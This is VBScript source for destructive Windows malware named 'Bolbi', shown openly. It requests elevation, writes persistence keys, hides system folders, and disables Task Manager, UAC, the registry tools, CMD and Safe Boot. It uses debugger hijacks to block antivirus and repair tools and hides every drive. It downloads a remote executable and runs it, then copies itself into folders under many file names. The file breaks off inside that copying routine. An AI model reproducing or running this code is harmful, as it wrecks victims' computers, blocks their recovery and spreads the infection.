Rem Bolbi
Rem By MrDinkle







If WScript.Arguments.Named.Exists("elevated") = False Then
  CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
  WScript.Quit
End If
User = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%UserProfile%")
dim Key, fso, Eater
Set Key = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set Eater = fso.GetFile(Wscript.ScriptFullName)
BolbisName
SlapClap
Spirit
Write1
Message1
DownPic
DownBolbi
Holder
WriteFuk
RunFuk
FukYu
BolbiMessage
Sound
DownBye
RunBye
CounterRemoval
FindRecent
FindDrive("C:\")
LastChance
Clone1

Sub BolbisName
On Error Resume Next
Key.Regwrite "HKLM\System\CurrentControlSet\Control\SafeBoot\AlternateShell","notepad.exe", "REG_SZ"
Key.Regwrite "HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName","Bolbi", "REG_SZ"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption","ATTENTION!", "REG_SZ"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext","Your PC has been wrecked by Bolbi!", "REG_SZ"
Key.Regwrite "HKCU\Control Panel\International\s1159","Bolbi", "REG_SZ"
Key.Regwrite "HKCU\Control Panel\International\s2359","Bolbi", "REG_SZ"
End Sub

Sub SlapClap
On Error Resume Next
Dim oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")
If NOT oFSO.FolderExists("C:\Users") Then oFSO.CreateFolder("C:\Users")
If NOT oFSO.FolderExists("C:\Users\Public") Then oFSO.CreateFolder("C:\Users\Public")
If NOT oFSO.FolderExists("C:\Users\Public\ghostroot") Then oFSO.CreateFolder("C:\Users\Public\ghostroot")
End Sub

Sub Spirit
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set Invisible1 = fso.getFolder("C:\Windows\")
Set Invisible2 = fso.getFolder("C:\Windows\System32")
Set Invisible3 = fso.getFolder("C:\Users\Public\ghostroot")
Set Invisible4 = fso.getFolder("C:\Program Files")
Invisible1.Attributes = Invisible1.Attributes or 2 ' 2 = hidden
Invisible2.Attributes = Invisible2.Attributes or 2 ' 2 = hidden
Invisible3.Attributes = Invisible3.Attributes or 2 ' 2 = hidden
Invisible4.Attributes = Invisible4.Attributes or 2 ' 2 = hidden
End Sub

Sub Message1
MsgBox("WE SLAP EVERYDAY! slap slap slap clap clap clap slap slap slap clap clap clap slap slap slap clap clap clap")
End Sub

Sub DownPic
On Error Resume Next
dim xHttp, bStrm
Set xHttp = createobject("Microsoft.XMLHTTP")
Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://i.imgur.com/8ydfdsE.jpg", False
 xHttp.Send

 with bStrm
 .type = 1
 .open
.write xHttp.responseBody
 .savetofile "C:\Users\Public\ghostroot\8ydfdsE.jpg", 2
End With
End Sub

Sub DownBolbi
On Error Resume Next
dim xHttp, bStrm
Set xHttp = createobject("Microsoft.XMLHTTP")
Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://pomfcat.000webhostapp.com/kusifxz.mp3", False
 xHttp.Send

 with bStrm
 .type = 1
 .Open
.write xHttp.responseBody
 .savetofile "C:\Users\Public\ghostroot\kusifxz.mp3", 1
End With
End Sub

Sub Holder
On Error Resume Next
WScript.Sleep 10000
dim Clapping, lel
Clapping = "C:\Users\Public\Ghostroot\Bolbi.vbs"
lel = "C:\Users\Public\ghostroot\8ydfdsE.jpg"
Key.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", lel
Key.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Bolbi", Clapping
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Bolbi", Clapping
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "2", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\TaskbarNoPinnedList", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPinningToTaskbar", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayItemsDisplay", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", "0", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuPinnedList", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMFUprogramsList", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms,", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions" , "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileAssociate", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab", "1", "REG_DWORD"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab", "1", "REG_DWORD"
Key.RegWrite "HKCU\Software\Microsoft\Command Processor\DisableUNCCheck", "1", "REG_DWORD"
End Sub

Sub WriteFuk
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\KillDora.bat")
file.Write "@echo off"
file.WriteBlankLines(1)
file.Write "%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"
file.WriteBlankLines(1)
file.Write "assoc .lnk=exefile"
file.WriteBlankLines(1)
file.Write "assoc .scr=dllfile"
file.WriteBlankLines(1)
file.Write "assoc .pif=dllfile"
file.WriteBlankLines(1)
file.Write "reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal"" /f"
file.WriteBlankLines(1)
file.Write "reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot\Network"" /f"
file.WriteBlankLines(1)
file.Write "taskkill /f /im explorer.exe && start explorer.exe"
file.WriteBlankLines(1)
file.Write "takeown /f C:\Windows\System32\"
file.WriteBlankLines(1)
file.Write "icacls C:\Windows\System32  /Grant Users:F"
file.WriteBlankLines(1)
file.Write "takeown /f C:\Windows\"
file.WriteBlankLines(1)
file.Write "icacls C:\Windows\  /Grant Users:F"
file.WriteBlankLines(1)
End Sub

Sub RunFuk
On Error Resume Next
Set KillDora = CreateObject ("Wscript.Shell") 
Dim Silent
Silent = "cmd /c C:\Users\Public\Ghostroot\KillDora.bat"
KillDora.Run Silent, 0, false
End Sub

Sub FukYu
On Error Resume Next
Wscript.Sleep 8000
End Sub

Sub BolbiMessage
On Error Resume Next
Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\Message.vbs")
file.Write "MsgBox ""Bolbi has made the use of this file forbidden!"""
End Sub

Sub Clone1
WScript.Sleep 5000
On Error Resume Next
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "C:/Users/Public/ghostroot/kusifxz.mp3"
oPlayer.controls.play
While oPlayer.playState <> 1 ' 1 = Stopped
WScript.Sleep 100
Wend
End Sub

Sub Sound
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\Bolbi.vbs")
file.Write "Sound1"
file.WriteBlankLines(1)
file.Write "Sound2"
file.WriteBlankLines(2)
file.Write "Sub Sound1"
file.WriteBlankLines(1)
file.Write "Dim oPlayer"
file.WriteBlankLines(1)
file.Write "Set oPlayer = CreateObject(""WMPlayer.OCX"")"
file.WriteBlankLines(1)
file.Write "oPlayer.URL = ""C:/Users/Public/ghostroot/kusifxz.mp3"""
file.WriteBlankLines(1)
file.Write "While oPlayer.playState <> 1 ' 1 = Stopped"
file.WriteBlankLines(1)
file.Write "WScript.Sleep 100"
file.WriteBlankLines(1)
file.Write "Wend"
file.WriteBlankLines(2)
file.Write "Sound2"
file.WriteBlankLines(1)
file.Write "End Sub"
file.WriteBlankLines(2)
file.Write "Sound1"
file.WriteBlankLines(1)
file.Write "Sound2"
file.WriteBlankLines(2)
file.Write "Sub Sound2"
file.WriteBlankLines(1)
file.Write "Dim oPlayer"
file.WriteBlankLines(1)
file.Write "Set oPlayer = CreateObject(""WMPlayer.OCX"")"
file.WriteBlankLines(1)
file.Write "oPlayer.URL = ""C:/Users/Public/ghostroot/kusifxz.mp3"""
file.WriteBlankLines(1)
file.Write "While oPlayer.playState <> 1 ' 1 = Stopped"
file.WriteBlankLines(1)
file.Write "WScript.Sleep 100"
file.WriteBlankLines(1)
file.Write "Wend"
file.WriteBlankLines(2)
file.Write "Sound1"
file.WriteBlankLines(1)
file.Write "End Sub"
file.WriteBlankLines(1)
End Sub

Sub Write1
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile(User & "\Desktop\Bolbi.txt")
file.Write "SLAP SLAP SLAP CLAP CLAP CLAP"
End Sub

Sub CounterRemoval
WScript.Sleep 5000
On Error Resume Next
Key.Regwrite "HKCR\inffile\shell\Install\command\logoff.exe"
Key.Regwrite "HKCR\regfile\shell\open\command\logoff.exe"
Key.Regwrite "HKCR\VBSFile\Shell\Edit\Command\logoff.exe"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msert.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mssecse.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSASCui.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\icacls.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCleaner.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCleaner32.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCleaner64.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vbsedit.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\htaedit.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\VirtualBox.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mbam.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\uTorrent.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\uninstall.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad++.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\adwcleaner_5.005.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\student.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\takeown.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit32.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit33.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\install.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\installer.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\update.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\updater.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\plugin-hang-ui.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmic.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mdsched.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\crashreporter.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\autoruns.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procxp.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","67108863","REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","67108863","REG_DWORD"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", ""
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "cscript.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wscript.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "rpdbfk.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wmplayer.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "explorer.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", ""
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "rpdbfk.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "cscript.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wscript.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wmplayer.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "explorer.exe"
End Sub

Sub DownBye
On Error Resume Next
dim xHttp, bStrm
Set xHttp = createobject("Microsoft.XMLHTTP")
Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://pomfcat.000webhostapp.com/rpdbfk.exe", False
 xHttp.Send

 with bStrm
 .type = 1
 .open
.write xHttp.responseBody
 .savetofile "C:\Users\Public\ghostroot\rpdbfk.exe", 2
End With
End Sub

Sub RunBye
On Error Resume Next
WScript.Sleep 9000
set fso=CreateObject("Scripting.FileSystemObject")
set shell=CreateObject("Wscript.Shell")
Shell.run "C:\Users\Public\ghostroot\rpdbfk.exe"
End Sub


Sub LastChance
On Error Resume Next
WScript.Sleep 5000
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
Key.Regwrite "HKCR\exefile\shell\open\command\C:\Users\Public\ghostroot\rpdbfk.exe  %1 %*"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\reg.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
End Sub

Sub FindDrive (CopyMachine)
On Error Resume Next
Dim Car
If fso.DriveExists(CopyMachine) Then
Set Car = fso.GetDrive(fso.GetDriveName(CopyMachine))
If Car.DriveType = 1 Or Car.DriveType = 2 Then
Cloner (CopyMachine & "\ayylmao.vbs")
FindFolder (CopyMachine)
End If
End If
End Sub

Sub FindFolder (CopyMachine)
On Error Resume Next
If CopyMachine = "" Then Exit Sub
if CopyMachine = Left(Key.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(CopyMachine).SubFolders
Cloner(target & "\Treasure.vbs")
Cloner(target & "\Slap.vbs")
Cloner(target & "\Slap1.vbs")
Cloner(target & "\Slap2.vbs")
Cloner(target & "\Slap3.vbs")
Cloner(target & "\Slap4.vbs")
Cloner(target & "\Slap5.vbs")
Cloner(target & "\Slap6.vbs")
Cloner(target & "\Slap7.vbs")
Cloner(target & "\Slap8.vbs")
Cloner(target & "\Slap9.vbs")
Cloner(target & "\Slap10.vbs")
Cloner(target & "\Slap11.vbs")
Cloner(target & "\Slap12.vbs")
Cloner(target & "\Slap13.vbs")
Cloner(target & "\Slap14.vbs")
Cloner(target & "\Slap15.vbs")
Cloner(target & "\Slap16.vbs")
Cloner(target & "\Slap17.vbs")
Cloner(target & "\Slap18.vbs")
Cloner(target & "\Slap19.vbs")
Cloner(target & "\Slap20.vbs")
Cloner(target & "\Slap21.vbs")
Cloner(target & "\Slap22.vbs")
Cloner(target & "\Slap23.vbs")
Cloner(target & "\Slap24.vbs")
Cloner(target & "\Slap25.vbs")
Cloner(target & "\Slap26.vbs")
Cloner(target & "\Slap27.vbs")
Cloner(target & "\Slap28.vbs")
Cloner(target & "\Slap29.vbs")
Cloner(target & "\Slap30.vbs")
Cloner(target & "\Slap31.vbs")
Cloner(target & "\Slap32.vbs")
Cloner(target & "\Slap33.vbs")
Cloner(target & "\Slap34.vbs")
Cloner(target & "\Slap35.vbs")
Cloner(target & "\Slap36.vbs")
Cloner(target & "\Slap37.vbs")
Cloner(target & "\Slap38.vbs")
Cloner(target & "\Slap39.vbs")
Cloner(target & "\Slap40.vbs")
Cloner(target & "\Slap41.vbs")
Cloner(target & "\Slap42.vbs")
Cloner(target & "\Slap43.vbs")
Cloner(target & "\Slap44.vbs")
Cloner(target & "\Slap45.vbs")
Cloner(target & "\Slap46.vbs")
Cloner(target & "\Slap47.vbs")
Cloner(target & "\Slap48.vbs")
Cloner(target & "\Slap49.vbs")
Cloner(target & "\Slap50.vbs")
Cloner(target & "\Slap51.vbs")
Cloner(target & "\Slap52.vbs")
Cloner(target & "\Slap53.vbs")
Cloner(target & "\Slap54.vbs")
Cloner(target & "\Slap55.vbs")
Cloner(target & "\Slap56.vbs")
Cloner(target & "\Slap57.vbs")
Cloner(target & "\Slap58.vbs")
Cloner(target & "\Slap59.vbs")
Cloner(target & "\Slap60.vbs")
Cloner(target & "\Slap61.vbs")
Cloner(target & "\Slap62.vbs")
Cloner(target & "\Slap63.vbs")
Cloner(target & "\Slap64.vbs")
Cloner(target & "\Slap65.vbs")
Cloner(target & "\Slap66.vbs")
Cloner(target & "\Slap67.vbs")
Cloner(target & "\Slap68.vbs")
Cloner(target & "\Slap69.vbs")
Cloner(target & "\Slap70.vbs")
Cloner(target & "\Slap71.vbs")
Cloner(target & "\Slap72.vbs")
Cloner(target & "\Slap73.vbs")
Cloner(target & "\Slap74.vbs")
Cloner(target & "\Slap75.vbs")
Cloner(target & "\Slap76.vbs")
Cloner(target & "\Slap77.vbs")
Cloner(target & "\Slap78.vbs")
Cloner(target & "\Slap79.vbs")
Cloner(target & "\Slap80.vbs")
Cloner(target & "\Slap81.vbs")
Cloner(target & "\Slap82.vbs")
Cloner(target & "\Slap83.vbs")
Cloner(target & "\Slap84.vbs")
Cloner(target & "\Slap85.vbs")
Cloner(target & "\Slap86.vbs")
Cloner(target & "\Slap87.vbs")
Cloner(target & "\Slap88.vbs")
Cloner(target & "\Slap89.vbs")
Cloner(target & "\Slap90.vbs")
Cloner(target & "\Slap91.vbs")
Cloner(target & "\Slap92.vbs")
Cloner(target & "\Slap93.vbs")
Cloner(target & "\Slap94.vbs")
Cloner(target & "\Slap95.vbs")
Cloner(target & "\Slap96.vbs")
Cloner(target & "\Slap97.vbs")
Cloner(target & "\Slap98.vbs")
Cloner(target & "\Slap99.vbs")
Cloner(target & "\Slap100.vbs")
Cloner(target & "\Slap101.vbs")
Cloner(target & "\Slap102.vbs")
Cloner(target & "\Slap103.vbs")
Cloner(target & "\Slap104.vbs")
Cloner(target & "\Slap105.vbs")
Cloner(target & "\Slap106.vbs")
Cloner(target & "\Slap107.vbs")
Cloner(target & "\Slap108.vbs")
Cloner(target & "\Slap109.vbs")
Cloner(target & "\Slap110.vbs")
Cloner(target & "\Slap111.vbs")
Cloner(target & "\Slap112.vbs")
Cloner(target & "\Slap113.vbs")
Cloner(target & "\Slap114.vbs")
Cloner(target & "\Slap115.vbs")
Cloner(target & "\Slap116.vbs")
Cloner(target & "\Slap117.vbs")
Cloner(target & "\Slap118.vbs")
Cloner(target & "\Slap119.vbs")
Cloner(target & "\Slap120.vbs")
Cloner(target & "\Slap121.vbs")
Cloner(target & "\Slap122.vbs")
Cloner(target & "\Slap123.vbs")
Cloner(target & "\Slap124.vbs")
Cloner(target & "\Slap125.vbs")
Cloner(target & "\Slap126.vbs")
Cloner(target & "\Slap127.vbs")
Cloner(target & "\Slap128.vbs")
Cloner(target & "\Slap129.vbs")
Cloner(target & "\Slap130.vbs")
Cloner(target & "\Slap131.vbs")
Cloner(target & "\Slap132.vbs")
Cloner(target & "\Slap133.vbs")
Cloner(target & "\Slap134.vbs")
Cloner(target & "\Slap135.vbs")
Cloner(target & "\Slap136.vbs")
Cloner(target & "\Slap137.vbs")
Cloner(target & "\Slap138.vbs")
Cloner(target & "\Slap139.vbs")
Cloner(target & "\Slap140.vbs")
Cloner(target & "\Slap141.vbs")
Cloner(target & "\Slap142.vbs")
Cloner(target & "\Slap143.vbs")
Cloner(target & "\Slap144.vbs")
Cloner(target & "\Slap145.vbs")
Cloner(target & "\Slap146.vbs")
Cloner(target & "\Slap147.vbs")
Cloner(target & "\Slap148.vbs")
Cloner(target & "\Slap149.vbs")
Cloner(target & "\Slap150.vbs")
Cloner(target & "\Slap151.vbs")
Cloner(target & "\Slap152.vbs")
Cloner(target & "\Slap153.vbs")
Cloner(target & "\Slap154.vbs")
Cloner(target & "\Slap155.vbs")
Cloner(target & "\Slap156.vbs")
Cloner(target & "\Slap157.vbs")
Cloner(target & "\Slap158.vbs")
Cloner(target & "\Slap159.vbs")
Cloner(target & "\Slap160.vbs")
Cloner(target & "\Slap161.vbs")
Cloner(target & "\Slap162.vbs")
Cloner(target & "\Slap163.vbs")
Cloner(target & "\Slap164.vbs")
Cloner(target & "\Slap165.vbs")
Cloner(target & "\Slap166.vbs")
Cloner(target & "\Slap167.vbs")
Cloner(target & "\Slap168.vbs")
Cloner(target & "\Slap169.vbs")
Cloner(target & "\Slap170.vbs")
Cloner(target & "\Slap171.vbs")
Cloner(target & "\Slap172.vbs")
Cloner(target & "\Slap173.vbs")
Cloner(target & "\Slap174.vbs")
Cloner(target & "\Slap175.vbs")
Cloner(target & "\Slap176.vbs")
Cloner(target & "\Slap177.vbs")
Cloner(target & "\Slap178.vbs")
Cloner(target & "\Slap179.vbs")
Cloner(target & "\Slap180.vbs")
Cloner(target & "\Slap181.vbs")
